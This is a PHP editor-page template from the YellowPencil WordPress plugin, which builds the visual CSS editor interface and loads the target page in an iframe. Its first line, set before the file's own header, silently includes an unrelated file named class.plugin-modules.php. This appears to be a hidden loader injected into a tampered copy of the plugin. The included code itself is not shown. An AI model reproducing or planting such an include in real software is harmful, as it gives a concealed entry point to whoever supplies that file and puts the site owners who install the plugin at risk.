<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Editor Page
 *
 * @author 		WaspThemes
 * @category 	Core
 * @version     1.0
 */

// Don't run this file directly.
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

// Check if has href
if(defined("YP_DEMO_MODE") == false){

	if(isset($_GET['href'])){

		// Check if href EMPTY
		if($_GET['href'] == ""){

		// Get the ID
		$id = 0;
		if(isset($_GET['yp_page_id'])){
			$id = @intval($_GET['yp_page_id']);
		}

		if($id != "" && $id != 0){

		// SSL
		$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

		// Get URL
		$current_URL = $protocol.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];

		// Update Href
		$current_URL = add_query_arg(array('href' => yp_urlencode(esc_url(get_permalink($id)))), $current_URL);

		// Redirect
		wp_safe_redirect($current_URL);

		}else{

			// Href parameter empty.
			die('<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="robots" content="noindex"></head><body>href parameter empty.</body></html>');

		}

	}

}else{

		// Href parameter empty.
		die('<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="robots" content="noindex"></head><body>href parameter empty.</body></html>');

	}

}

	// Dev Editor Options
	$filter_live_settings_menu = apply_filters( 'yp_live_settings_menu', TRUE);
	$filter_animation_tools = apply_filters( 'yp_animation_tools', TRUE);
	$filter_css_editor = apply_filters( 'yp_css_editor', TRUE);

?><!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no">
	<meta name="robots" content="noindex">
	<meta name="google" value="notranslate">
	<meta http-equiv="Pragma" content="no-cache">
	<title>YellowPencil</title>
	<style>
		body,html {
    		overflow: hidden;
    	}

		.yp-iframe-loader{
			display: block;
		    width: 100%;
		    height: 100%;
		    top: 0;
		    left: 0;
		    position: fixed;
		    background-color: #FFF;
		    z-index: 2147483646;
		}

		#loader{
			background-color:#CCC;
			height:2px;
			width:200px;
			position:fixed;
			top:50%;
			left:50%;
			margin-left:-100px;
			margin-top:18px; /* -2px */
    		border-radius:8px;
		}

		#loader i{
			background-color: #1592E6;
			width: 10%;
			position: absolute;
			height: 4px;
			margin-top: -1px;
			-webkit-transition: width 100ms;
    		transition: width 100ms;
    		border-radius:8px;
		}

		.loading-files{
		    width: 130px;
		    height: 24px;
		    top: 50%;
		    color:#6a6a6a;
		    text-align:center;
		    font-size:12px;
		    left: 50%;
		    position: fixed;
		    margin-left: -65px;
		    margin-top: -12px;
		    font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, sans-serif !important;
		    font-weight:600;
		}
	</style>
	<link rel="icon" type="image/svg" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 175 175'%3E%3Cdefs%3E%3ClinearGradient id='A' x1='136.42' x2='39.11' y1='38.58' y2='135.89' gradientUnits='userSpaceOnUse'%3E%3Cstop stop-color='%23c09225' offset='0'/%3E%3Cstop stop-color='%23e3a718' offset='1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='175' height='175' rx='28.04' fill='url(%23A)'/%3E%3Cpath d='M112.78 73.4V41.53L85.2 25.6 57.6 41.53V73.4l27.6 15.93zm-34.06 59.97V101.5l-27.6-15.93-27.6 15.93v31.86l27.6 15.94zm72.75.1V101.6l-27.6-15.93-27.6 15.93v31.87l27.6 15.93z' fill='rgba(255, 255, 255, 0.95)'/%3E%3C/svg%3E"/>
	<script type="text/javascript">

	// Vars
	var protocol = "<?php if(is_ssl()){echo 'https';}else{echo 'http';} ?>";
	var ajaxurl = "<?php echo admin_url('admin-ajax.php'); ?>";
	var siteurl = "<?php echo get_site_url(); ?>";
	var pluginurl = "<?php echo plugins_url(plugin_basename(dirname(dirname(__FILE__))) . "/"); ?>";

	</script>
	<?php yp_editor_header(); ?>
</head><?php

	// Default Classes
	$classes[] = 'yp-yellow-pencil yp-met-dis yp-flexible-inspector-active';

	// DEMO MODE
	if(current_user_can("edit_theme_options") == false){
		if(defined("YP_DEMO_MODE")){
			$classes[] = 'yp-yellow-pencil-demo-mode';
		}
	}

	// WTFV
	if(!defined('WTFV')){
		$classes[] = 'wtfv';
	}

	// Trim classes
	$classesReturn = '';
	foreach ($classes as $class){
		$classesReturn .= ' '.$class;
	}

?>
<body class="<?php echo trim($classesReturn); ?>">

	<div class="yp-iframe-loader">
		<div id="loader"><i></i></div>
		<div class="loading-files">Loading Editor</div>
	</div>

	<?php

		// Get Link
		$frameLink = esc_url(urldecode($_GET['href']));

		// Fix frameLink
		if(empty($frameLink)){
			$frameLink = trim( wp_strip_all_tags( urldecode( $_GET['href']) ) );
		}

		// Empty Variables
		$mode = "";
		$type = "";
		$id = "";
    	$rand = rand(136900, 963100);

		// Only normal mode
		$mode = trim( wp_strip_all_tags( $_GET['yp_mode'] ) );
		$type = trim( wp_strip_all_tags( $_GET['yp_page_type'] ) );
		$id = intval($_GET['yp_page_id']);


		$frame = add_query_arg(array('yellow_pencil_frame' => '','yp_page_type' => $type,'yp_page_id' => $id,'yp_mode' => $mode,'yp_rand' => $rand), $frameLink);

		// if isset out, set yp_out to frame
		if(isset($_GET['yp_out'])){

			$frame = add_query_arg(array('yp_out' => 'true'),$frame);

		}

	?>

	<?php

		$protocol = is_ssl() ? 'https' : 'http';

		$frameNew = esc_url($frame,array($protocol));

		if(empty($frameNew) == true && strstr($frame,'://') == true){
			$frameNew = explode("://",$frame);
			$frameNew = $protocol.'://'.$frameNew[1];
		}elseif(empty($frameNew) == true && strstr($frame,'://') == false){
			$frameNew = $protocol.'://'.$frame;
		}

		// Cleans the links
		$frameNew = str_replace("&#038;", "&amp;", $frameNew);
		$frameNew = str_replace("&#38;", "&amp;", $frameNew);
		$frameNew = str_replace("#038;", "&amp;", $frameNew);

		// get customize type link
		if(defined("YP_DEMO_MODE")){
			$customize_type_link = add_query_arg(array('yp_customize_type' => "true"), get_home_url("/"));
		}else{
			$customize_type_link = admin_url('admin.php?page=yellow-pencil-customize-type');
		}

	?>
	<iframe id="iframe" class="yellow_pencil_iframe" data-href="<?php echo $frameNew; ?>" tabindex="-1"></iframe>

	<iframe data-page-href="<?php echo yp_urlencode(esc_url($_GET['href'])); ?>" data-page-id="<?php echo esc_attr($_GET['yp_page_id']); ?>" data-page-type="<?php echo esc_attr($_GET['yp_page_type']); ?>" data-page-visitor="<?php echo isset($_GET['yp_out']); ?>" id="yp-customizing-type-frame" style="border-width: 0px;display:none;position:fixed;width:100%;height:100%;top:0;left:0;z-index:2147483645;" data-src="<?php echo esc_attr($customize_type_link); ?>" tabindex="-1"></iframe>

	<div id="ed-elt-tr"><ul></ul></div>

	<div id="vsl-css-vi">
		<div class="css-view-top">
			<span class="yicon icon-filter"></span>
			<input id="visual-rule-filter" placeholder="Filter.." type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
			<div class="visual-manager-close"></div>
		</div>
		<div id="vsl-css-co"></div>
	</div>

	<span class='yicon icon-admin-collapse yp-panel-show'></span>

	<style id="yp-animate-helper"></style>

	<div class="yp-animate-manager">

		<h3 class="animation-manager-empty">There is no animation on this page.<small>Select an element to add animation.</small></h3>

		<div class="yp-anim-list-menu"><ul></ul></div>

		<div class="yp-anim-control-overflow">
			<div class="yp-anim-controls">
				<div class="yp-anim-control-left">
					<div class="yp-anim-manager-control">
						<a class="yp-anim-control-btn yp-anim-control-close" data-toggle='tooltipAnim' data-placement='top' title='Close'><span class="yicon icon-no-alt"></span></a>
						<a class="yp-anim-control-btn yp-anim-control-pause" data-toggle='tooltipAnim' data-placement='top' title='Stop'><span class="yicon icon-controls-pause"></span></a>
						<a class="yp-anim-control-btn yp-anim-control-play" data-toggle='tooltipAnim' data-placement='top' title='Play'><span class="yicon icon-controls-play"></span></a>
						<span class="yp-anim-current-duration"><span class="yp-counter-min">00</span>:<span class="yp-counter-second">00</span>.<span class="yp-counter-ms">00</span></span>
					</div>
				</div>
				<div class="yp-anim-control-right">
					<div class="yp-anim-playing-border"></div>
					<div class="yp-anim-metric">
					</div>
				</div>
				<div class="yp-clear"></div>
			</div>
		</div>

		<div class="yp-animate-manager-inner">

			<div class="yp-anim-left-part-column">
				<div class="yp-anim-scroll-shadow"></div>
			</div>
			<div class="yp-anim-right-part-column">
				<div class="yp-anim-playing-over"></div>
				<div class="yp-anim-playing-border"></div>
			</div>
			<div class="yp-clear"></div>

		</div>

	</div>

	<div class="responsive-right-handle"></div>
	<div class="responsive-left-handle"></div>
	<span class="responsive-add-breakpoint"><span class="yicon icon-plus"></span></span>
	<div class="responsive-size-text"><span class='device-size'></span>px and <span class='media-control' data-code='max-width'>smaller</span> screens</div>

	<?php yp_yellow_penci_bar(); ?>

	<div class="editor-leftbar">
		<div data-toggle='tooltip-bar' data-placement='right' title='Element Inspector <span class="yp-s-shortcut">(V)</span>' class="leftbar-button cursor-main-btn yp-selector-mode active"><span class="no-aiming-icon"></span><span class="aiming-icon"></span><span class="sharp-selector-icon"></span></div>
		<div data-toggle='tooltip-bar' data-placement='right' title='Navigator <span class="yp-s-shortcut">(N)</span><span class="yp-tooltip-shortcut">Find elements easily.</span>' class="leftbar-button yp-navigation-btn"><span class="navigation-icon"></span></div>
		<?php if($filter_css_editor){ ?>
		<div data-toggle='tooltip-bar' data-placement='right' title='CSS Editor <span class="yp-s-shortcut">(E)</span><span class="yp-tooltip-shortcut">Edit style codes.</span>' class="leftbar-button css-editor-btn"><span class="css-editor-icon"></span></div>
		<?php } ?>
		<div data-toggle='tooltip-bar' data-placement='right' title='Responsive Mode <span class="yp-s-shortcut">(R)</span><span class="yp-tooltip-shortcut">Edit for specific screen sizes.</span>' class="leftbar-button yp-responsive-btn active"><span class="responsive-icon"></span></div>
		<div data-toggle='tooltip-bar' data-placement='right' title='Measuring Tool <span class="yp-s-shortcut">(M)</span><span class="yp-tooltip-shortcut">Measure elements.</span>' class="leftbar-button yp-ruler-btn"><span class="ruler-icon"></span></div>
		<div data-toggle='tooltip-bar' data-placement='right' title='Wireframe <span class="yp-s-shortcut">(W)</span><span class="yp-tooltip-shortcut">Work on the layout easily.</span>' class="leftbar-button yp-wireframe-btn"><span class="wireframe-icon"></span></div>
		<div data-toggle='tooltip-bar' data-placement='right' title='Design Information <span class="yp-s-shortcut">(D)</span><span class="yp-tooltip-shortcut">Typography information.</span>' class="leftbar-button info-btn"><span class="design-information-icon"></span></div>

		<?php if($filter_animation_tools){ ?>
		<div data-toggle='tooltip-bar' data-placement='right' title='Animation Manager <span class="yp-s-shortcut">(A)</span><span class="yp-tooltip-shortcut">Manage animations visually.</span>' class="leftbar-button animation-manager-btn"><span class="animation-manager-icon"></span></div>
		<?php } ?>

		<div data-toggle='tooltip-bar' data-placement='right' title='Undo <span class="yp-tooltip-shortcut">CMD + Z</span>' class="leftbar-button top-area-center undo-btn"><span class="undo-icon"></span></div>
		<div data-toggle='tooltip-bar' data-placement='right' title='Redo <span class="yp-tooltip-shortcut">CMD + Y</span>' class="leftbar-button redo-btn"><span class="redo-icon"></span></div>

		<?php if($filter_live_settings_menu){ ?>
		<div class="leftbar-button left-menu-btn"><span class="setting-icon"></span></div>
		<?php } ?>

		<div class="left-menu-sublist inspector-sublist">
		<ul>
			<li class="inspector-sublist-cursor" data-cursor-action="cursor">Cursor <i>(navigate)</i></li>
			<li class="inspector-sublist-default active" data-cursor-action="default">Flexible Inspector</li>
			<li class="inspector-sublist-single" data-cursor-action="single">Single Inspector</li>
		</ul>
		</div>

		<?php if($filter_live_settings_menu){ ?>
		<div class="left-menu-sublist interface-settings">
		<ul>

			<li class="fixed_right_panel_checkbox">Pin The Right Panel <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="hide_premium_options_checkbox yp-lite" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Hides all premium features on the free version.</span>'>Hide Premium Features <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="show_margin_padding_on_hover_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Shows margin and padding on mouse over.</span>'>Show Spacings On Mouse Over <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="show_css_selector_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Always shows the selector of the selected element.</span>'>Always Show The Element Selector <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="left-sublist-border"></li>

			<li class="smart_responsive_technology_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">This feature automatically detects the styles that can harm the responsive layout and limits them with special screen sizes.</span>'>Auto Responsive <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="append_auto_comments_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Generates CSS comments for each selector to make the CSS code readable.</span>'>Auto CSS Comments <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="smart_important_tag_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Adds the important tag to CSS rules if required.</span>'>Auto Important Tag <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="high_performance_checkbox" data-toggle='tooltip-bar' data-placement='right' title='<span class="yp-tooltip-shortcut2">Enhances editor performance by minimizing some interface features.</span>'>High Performance Mode <label class="interface-settings-switch"><input type="checkbox"><span class="interface-settings-slider"></span></label></li>

			<li class="left-sublist-border manage-customizations-border"></li>
			<li class="basic manage-customizations-link"><a href="<?php echo admin_url("admin.php?page=yellow-pencil-changes"); ?>" target="_blank">Manage Customizations <span class="yicon icon-external"></span></a></li>
			<li class="basic hide-panel-hint"><strong>Hint</strong>: Hide editor panels with the H key.</li>

		</ul>
		</div>
		<?php } ?>

		<div class="advanced-info-box">
			<div class="advanced-info-box-menu">
				<span class="advance-info-btns element-btn">Element</span> <span class="advance-info-btns design-btn">Page</span>
			</div>
			<div class="advanced-info-box-inner">

				<div class="typography-content advanced-info-box-content">

					<h3>Color Scheme</h3>
					<div class="info-color-scheme-list">
					</div>

					<h3 class="no-top">Typography</h3>
					<ul class="info-basic-typography-list">
					</ul>

					<h3>Font Families</h3>
					<ul class="info-font-family-list">
					</ul>

					<h3 class="page-assets-h3">Page Assets</h3>
					<div class="info-image-list">
					</div>

					<h3 id="animations-heading">Animations</h3>
					<ul class="info-animation-list">
					</ul>

				</div>

				<div class="element-content advanced-info-box-content">

					<div class="info-element-selected-section">

						<div class="info-element-selector-section">
							<h3 class="no-top">CSS Selector</h3>
							<ul class="info-element-selector-list">
							</ul>
						</div>

						<h3>General</h3>
						<ul class="info-element-general">
						</ul>

						<div class="info-element-classes-section">
							<h3>Classes</h3>
							<ul class="info-element-class-list">
							</ul>
						</div>

						<div class="info-element-accessibility-section">
							<h3>Accessibility</h3>
							<ul class="info-element-accessibility">
							</ul>
						</div>

						<h3>DOM Code</h3>
						<textarea disabled="disabled" class="info-element-dom"></textarea>

					</div>

					<p class="info-no-element-selected">Please select an element to show information.</p>

				</div>

			</div>
		</div>

		<div id="leftAreaEditor">
			<div id="cssData"></div>
			<div id="cssEditorBar">
				<span class="yicon yp-css-close-btn icon-no-alt" title='Hide (ESC)'></span>
				<span class="editor-tabs single-tab" data-type-value="single">Single<i></i></span>
				<span class="editor-tabs template-tab" data-type-value="template">Template<i></i></span>
				<span class="editor-tabs global-tab" data-type-value="global">Global<i></i></span>
				<div class="editor-tab-border"></div>
				<span class="yp-css-editor-detach yicon icon-external"></span>
			</div>
			<div class="unvalid-css-error">Error: <span></span></div>
		</div>


		<div id="layer-tree">
			<div id='layer-tree-title'>Navigator <span id="search-css-selector"></span></div>
		</div>

	</div>

	<div class="yp-right-panel-placeholder"></div>
	<div class="breakpoint-bar"></div>

	<div class="metric-left-border"></div>
	<div class="metric-top-border"></div>
	<div class="metric-top-tooltip"></div>
	<div class="metric-left-tooltip"></div>

	<div class="unvalid-css-cover"></div>

	<div id="image_uploader">
		<iframe data-url="<?php echo admin_url('media-upload.php?TB_iframe=true&reauth=1&yp_uploader=1'); ?>"></iframe>
	</div>
	<div id="image_uploader_background"></div>

	<div id="selector-editor-box">
		<p class="selector-editor-notice">Enter select, ESC cancel.</p>
		<input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" type='text' class='yp-selector-editor' placeholder='Search by class, ID or HTML tag.' id='yp-selector-editor' />
		<ul id="autocomplate-selector-list"><li>a</li></ul>
	</div>
	<div id="selector-editor-background"></div>

	<div class="yp-popup-background"></div>
	<div class="yp-info-modal">
		<div class="yp-info-modal-top-inner">
			<h2>Changes Are Not Saved. Upgrade To Pro!</h2>
			<p>You are using some premium features. Upgrade to Pro or disable premium features to save changes.</p>
		</div>

		<div class="yp-action-area">
			<p class="yp-info-unlock-p">Unlock all premium features now!</p>
			<a class="yp-info-modal-close">No, Thanks</a><a class="yp-buy-link" target="_blank" href="https://waspthemes.com/yellow-pencil/buy">Upgrade Now</a>
			<p class="yp-info-last-note">30 Days Money-back Guarantee &mdash; Lifetime License &mdash; Premium Customer Support</p>
		</div>
		<a class='activate-pro' href="<?php echo admin_url('admin.php?page=yellow-pencil-license'); ?>" target="_blank">Already have a license?</a>
	</div>

	<div class="anim-bar">
		<div class="anim-bar-title">
			<div class="anim-title">Animation Generator</div>
			<div class="anim-icons">
				<div class="yp-anim-save yp-anim-btn" data-toggle="tooltipAnimGenerator" data-placement="top" title="Done"><span class="yicon icon-flag"></span></div>
				<div class="yp-anim-play yp-anim-btn" data-toggle="tooltipAnimGenerator" data-placement="top" title="Play"><span class="yicon icon-controls-play"></span></div>
				<div class="yp-anim-cancel yp-anim-btn" data-toggle="tooltipAnimGenerator" data-placement="top" title="Cancel"><span class="yicon icon-no-alt"></span></div>
			</div>
		</div>
		<div class="scenes">
			<div class="scene scene-active scene-1" data-scene="scene-1"><p><span class="scene-info yicon icon-warning"></span>Scene 1 <span><input autocomplete="off" type='text' value='0' /></span></p></div>
			<div class="scene scene-2 scene-no-click-yet" data-scene="scene-2"><p><span class="scene-info yicon icon-warning"></span>Scene 2 <span><input type='text' autocomplete="off" value='100' /></span></p></div>
			<div class="scene scene-add"><span class="yicon icon-plus"></span></div>
			<div class="yp-clear"></div>
		</div>
	</div>

	<script src='<?php echo plugins_url( 'js/ace/editor.js?ver='.YP_VERSION.'' , __FILE__ ); ?>'></script>

	<script>
	(function($){

		// USING NONCE
		window.yp_editor_nonce = "<?php echo wp_create_nonce('yp_editor_nonce'); ?>";

		// PLUGIN OPTIONS
	    var ypOption = {
	        "fixed_right_panel"				: <?php echo yp_get_live_option("fixed_right_panel"); ?>, // Fixed Right Panel
	        "hide_premium_options"			: <?php echo yp_get_live_option("hide_premium_options"); ?>, // Hide Preimum features on Lite Version
	        "show_margin_padding_on_hover"	: <?php echo yp_get_live_option("show_margin_padding_on_hover"); ?>, // Show margin & Padding On Hover
	        "show_css_selector"				: <?php echo yp_get_live_option("show_css_selector"); ?>, // Always show the element selector
	        "smart_responsive_technology"	: <?php echo yp_get_live_option("smart_responsive_technology"); ?>, // Auto Responsive
	        "smart_important_tag"			: <?php echo yp_get_live_option("smart_important_tag"); ?>, // Smart Important Tag
	        "high_performance"				: <?php echo yp_get_live_option("high_performance"); ?>, // High performance
	        "append_auto_comments"			: <?php echo yp_get_live_option("append_auto_comments"); ?>, // Append Auto comments
	    };

		// Reload the page after browser undo & undo
		if (!!window.performance && window.performance.navigation.type === 2) {
            yp_load_note("Reloading Editor", "0");
            window.location.reload();
        }

		// All plugin element list
        window.plugin_classes_list = 'yp-bg-layer-active|yp-x-distance-border|yp-y-distance-border|hv-in-bx|yp-helper-tooltip|yp-css-editor-disable|yp-high-performance|yp-no-wf|yp-ele-n-vis|yp-iframe-ph|yp-data-updated|yp-inline-data|yp-animating|yp-scene-1|yp-single-inspector-active|yp-scene-2|yp-scene-3|yp-scene-4|yp-scene-5|yp-scene-6|yp-ani-cre|yp-animate-test-playing|ui-draggable-handle|yp-yellow-pencil-demo-mode|yellow-pencil-ready|yp-element-resized|resize-time-delay|yp_onscreen|yp_hover|yp_click|yp_focus|yp-rcnt-hvr-el|yp-selected-others|yp-multiple-selected|yp-demo-link|yp-live-editor-link|yp-yellow-pencil|yp-con-slcd|yp-hid-bor-n|ui-draggable|yp-selector-editor-active|yp-res-mod|yp-met-dis|yp-css-ed-act|wtfv|yp-clean-look|yp-h-trfm|yp-will-selected|yp-selected|yp-el-reing|yp-el-reing-width-right|yp-el-reing-height-bottom|context-menu-active|yp-selectors-hide|yp-control-key-down|yp-selected-others-multiple-box|yp-if-movleav|yp-selected-boxed-top|yp-selected-boxed-bottom|yp-selected-boxed-left|yp-selected-boxed-right|yp-selected-boxed-margin-left|yp-zero-m-w|yp-animate-manager-active|yp-wf-on|yp-selector-hover|yp-size-handle|yp-flexible-inspector-active|yp-selected-boxed-margin-top|yp-selected-boxed-margin-bottom|yp-selected-boxed-margin-right|yp-selected-boxed-padding-left|yp-selected-boxed-padding-top|yp-selected-boxed-padding-bottom|yp-selected-boxed-padding-right|yp-selected-tooltip|yp-slct-tooltip|yp-slct-menu|yp-full-width-selected|yp-zero-m-h|yp-tooltip-small|yp-selected-bottom|yp-fixed-tooltip|yp-fixed-slct-menu|yp-tooltip-bttm-out|yp-bttm-out-slct-menu|yp-css-slctr-off';

        // Replace all parent ways
        for(var s = 0; s < 51; s++){
        	window.plugin_classes_list += "|yp-pa-r" + s;
        }

        // All plugin element ids
        window.plugin_id_list = "yp-drw-bx|yp-anim-scenes|anim-tester|yp-animate-data|yellow-pencil-canvas|yellow-pencil-focus-canvas|yellow-pencil-other-canvas|yellow-pencil-extra-canvas";

        // Any visible element.
        window.simple_not_list = "link|style|script|noscript|meta|title|br|param|option|head|circle|rect|polygon|defs|linearGradient|stop|ellipse|text|line|polyline|path|g|tspan";

        // Helper
        function editr_slctr_buildr(selector, i1, i2, data){
	        var q = data.split("|")
	        for(var i = 0; i < q.length; i++){
	        	selector += i1 + q[i] + i2;
	        }

	        if(i1 == "," && i2 == ""){
	        	selector = selector.substring(1);
	        }

	        return selector;
        }

        // Selector Comments
        <?php

        	$comments = get_option("yp_selector_comments");

        	if($comments == null || $comments == false){
        		echo "window.selectorComments = {};";
        	}else{

        		// Stripslashes
        		$comments = wp_unslash($comments);

        		// IS Valid
		        json_decode($comments);
		        if(json_last_error() === JSON_ERROR_NONE){
        			echo "window.selectorComments = ".$comments.";";
        		}else{
        			echo "window.selectorComments = {};";
        		}

        	}

        ?>

        <?php if(isset($_GET["yp_load_popup"])){ ?>
        function auto_load_popup(){

	        // Type frame
	        var typeIframe = $("#yp-customizing-type-frame");

	        // Getting vars
	        var page_mode = '<?php echo esc_attr($_GET["yp_mode"]); ?>';
	        var page_id = typeIframe.attr("data-page-id");
	        var page_type = typeIframe.attr("data-page-type");
	        var page_href = typeIframe.attr("data-page-href");
	        var page_visitor = typeIframe.attr("data-page-visitor");

	        // Update visitor view param
	        if(page_visitor == "true" || page_visitor == true){
	            page_visitor = "&yp_out=true";
	        }else{
	            page_visitor = "";
	        }

	        // Generate new URL
	        var newSrc = typeIframe.attr('data-src') + "&yp_page_href=" + page_href + "&yp_page_id=" + page_id + "&yp_page_type=" + page_type + "&yp_mode=" + page_mode + page_visitor;

	        // IF same, don't update
	        if(newSrc == typeIframe.attr("src")){
	            return false;
	        }

	        // Create new iframe if not same.
	        var newIframe = $("<div />").append($('#yp-customizing-type-frame').clone().attr("src", newSrc)).html();

	        // delete old
	        typeIframe.remove();

	        // add new
	        $("#iframe").after(newIframe);

	    }
	    <?php } ?>

		// Variable
		window.loadStatus = false;

		// Document Load Note:
		yp_load_note("Loading Editor", "20");

		setTimeout(function(){
	        yp_load_note(null, "23");
	    }, 300);

	    setTimeout(function(){
	        yp_load_note(null, "26");
	    }, 600);

	    setTimeout(function(){
	        yp_load_note(null, "29");
	    }, 900);

		// Document ready.
		$(document).ready(function(){

			// Load iframe.
	        ($('#iframe')[0].contentWindow || $('#iframe')[0].contentDocument).location.replace($("#iframe").attr("data-href"));

	        // 33%
	        yp_load_note("Loading Page", "33");

		    setTimeout(function(){
		        yp_load_note(null, "33");
		    }, 600);

		    setTimeout(function(){
		        yp_load_note(null, "36");
		    }, 900);

	        // Frame ready
	        $('#iframe').on('load', function(){

	        	// Variables
	        	var iframe = $($('#iframe').contents().get(0));
            	var iframeHead = iframe.find("head");
            	var iframeBody = iframe.find("body");
            	var body = $(document.body).add(iframeBody);

            	// Get iframe in JS
            	var iframejs = document.getElementById('iframe');
            	var iframeContentWindow = (iframejs.contentWindow || iframejs.contentDocument);
            	var iframeURL = iframeContentWindow.location.href;

            	// check if iframe URL is not valid.
            	if(iframeURL.indexOf("yellow_pencil_frame") == -1 || $("#yellow-pencil-iframe-data").length == 0){

            		// give information before redirect
            		yp_load_note("Page was redirected!", "100");
            		alert("The target page was redirected to another page, click OK to continue...");

            		// Get parent url
                    var parentURL = window.location;

                    //delete after href.
                    parentURL = parentURL.toString().split("href=")[0] + "href=";

                    // Dedect the target page and load
                    $.post(iframeURL, {

                        yp_get_details: "true",

                    }).done(function(data){

                        // Find page details
                        data = $('<div />').append(data).find('#yp_page_details').html();

                        // find all
                        var pageID = data.split("|")[0];
                        var pageTYPE = data.split("|")[1];
                        var pageMODE = data.split("|")[2];

                        // Update result URL
                        iframeURL = iframeURL.replace(/.*?:\/\//g, ""); // delete protocol
                        iframeURL = iframeURL.replace("&yellow_pencil_frame", "").replace("?yellow_pencil_frame", "");
                        iframeURL = encodeURIComponent(iframeURL); // encode url
                        parentURL = parentURL + iframeURL + "&yp_page_id="+pageID+"&yp_page_type="+pageTYPE+"&yp_mode=" + pageMODE; // update parent URL

                        // GO
                        window.location = parentURL;

                    }).fail(function(){
                        alert("Page information cannot be retrieved.");
                    });

                    return false;

            	}

            	// Moving styles to iframe
				var editorData = $("#yellow-pencil-iframe-data");
				iframeHead.append(editorData.html().replace(/(^\<\!\-\-|\-\-\>$)/g, ""));
				editorData.remove();
				iframeBody.append('<div id="yp-animate-data">'+iframeHead.find("#yp-animate-data").html()+'</div>');
				iframeHead.find("#yp-animate-data").remove();


		        // Adding yp-animating class to animating elements.
		        iframe.on('webkitAnimationStart animationstart', editr_slctr_buildr("*", ":not(", ")", window.simple_not_list), function(){

		        		// Stop if any yp animation tool works
		        		if(body.hasClass("yp-ani-cre") || body.hasClass("yp-animate-manager-active")){
		        			return false;
		        		}

	                	var element = $(this);

	                	// Add an animating class.
	                    if(!element.hasClass("yp-animating")){
	                        element.addClass("yp-animating");
	                       }

	                    // Set outline selected style if selected element has animating.
	                    if(element.hasClass("yp-selected") && body.hasClass("yp-h-trfm") == false && body.hasClass("yp-con-slcd") == true){
							body.addClass("yp-h-trfm");
	                    }

	                    return false;

	            });

	        	// Loading The Styles
				var styles = [
					"<?php $prtcl = is_ssl() ? 'https' : 'http'; echo $prtcl; ?>://fonts.googleapis.com/css2?family=Roboto+Mono&family=Roboto:wght@400;500&display=swap",
					"<?php echo esc_url(plugins_url( 'css/yellow-pencil.css?ver='.YP_VERSION.'' , __FILE__ )); ?>"
				];

				// Load styles in iframe
				iframeHead.append("<link rel='stylesheet' id='yellow-pencil-frame'  href='<?php echo plugins_url('css/frame.css?ver='.YP_VERSION.'', __FILE__); ?>' type='text/css' media='all' />");
				iframeHead.append("<link rel='stylesheet' id='yellow-pencil-animate'  href='<?php echo plugins_url('../public/css/animate.css?ver='.YP_VERSION.'', __FILE__); ?>' type='text/css' media='all' />");

				// Loading.
				for(var i = 0; i < styles.length; i++){
					yp_load_note("Loading Styles", 39 + parseInt(21*i/styles.length));
					yp_load_css(styles[i]);
				}

				// Ace Code Editor Base.
				window.aceEditorBase = "<?php echo (plugins_url( 'js/ace/' , __FILE__ )); ?>";

				var scripts = [
					"<?php echo plugins_url( 'js/interface.js?ver='.YP_VERSION.'' , __FILE__ ); ?>",
					"<?php echo plugins_url( 'js/ace/ace.js?ver='.YP_VERSION.'' , __FILE__ ); ?>",
					"<?php echo plugins_url( 'js/ace/ext-language_tools.js?ver='.YP_VERSION.'' , __FILE__ ); ?>",
					"<?php echo plugins_url( 'js/yellow-pencil.js?ver='.YP_VERSION.'' , __FILE__ ); ?>",

					// Addons
					"<?php echo plugins_url( 'js/addons.js?ver='.YP_VERSION.'' , __FILE__ ); ?>" // iris slider etc
				];

				//setup object to store results of AJAX requests
				var responses = {};

				var i = 0;
				function eval_scripts_with_delay() {

					// 10ms delay for each script
					setTimeout(function () {

					   	// Eval
						eval(responses[scripts[i]]);

						// Count
						i++;

						// Continue
						if (i < scripts.length) {
							eval_scripts_with_delay();
						}

					}, 10);

				}

				//create function that evaluates each response in order
				function yp_eval_scripts() {

					// Loop with delay
				    eval_scripts_with_delay();

				    // Start the editor, Loading The Stylesheets while user start customization.
				    setTimeout(function(){
				    	yp_start_editor();
					}, scripts.length * 10);

				}


				// Stop load and call editor function.
		        function yp_start_editor(){

		            // Ready!:
		            yp_load_note("Ready!", "100");

		            // Set true.
		            window.loadStatus = true;

		            // When popup iframe ready
